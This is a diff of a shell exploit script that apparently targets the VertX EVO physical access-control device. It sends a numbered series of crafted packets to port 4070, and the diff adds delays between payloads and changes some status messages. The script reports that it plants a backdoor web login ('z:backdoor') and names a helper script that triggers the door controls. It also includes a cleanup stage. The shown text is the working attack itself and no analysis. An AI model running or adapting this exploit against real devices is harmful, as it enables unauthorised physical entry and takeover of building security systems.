@@ -82,6 +82,7 @@ then
   echo "[*] Executing"
   echo "[*] Sending Payload 1"
   ${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 ${TARGET} 2> /dev/null
+  sleep 5
   echo ""
 
   echo "[*] Sending Payload 2"
@@ -90,6 +91,7 @@ then
 
   echo "[*] Sending Payload 3"
   ${CMDEXEC} -2 -p 4070 -c 1 -E data3.txt -d 150 ${TARGET} 2> /dev/null
+  sleep 5
   echo ""
 
   echo "[*] Sending Payload 4"
@@ -137,7 +139,7 @@ then
   fi
   echo "[*] Exploitation Complete."
   echo "[*] Login at https://${TARGET}/ with z:backdoor for manual control over the VertX EVO."
-  echo "[*] Or use door.sh to trigger the locking mechanism from commandline."
+  echo "[*] Or use triggeragent.sh to trigger the controls"
   exit 1
  fi
 
@@ -187,7 +189,7 @@ then
   ${CMDEXEC} -2 -p 4070 -c 1 -E data12.txt -d 150 ${TARGET} 2> /dev/null
   echo ""
   cd ../
-  echo "[*] Cleanup Complete."
+  echo "[*] Cleanup of ${TARGET} complete."
   exit 1
 fi
 exit 1
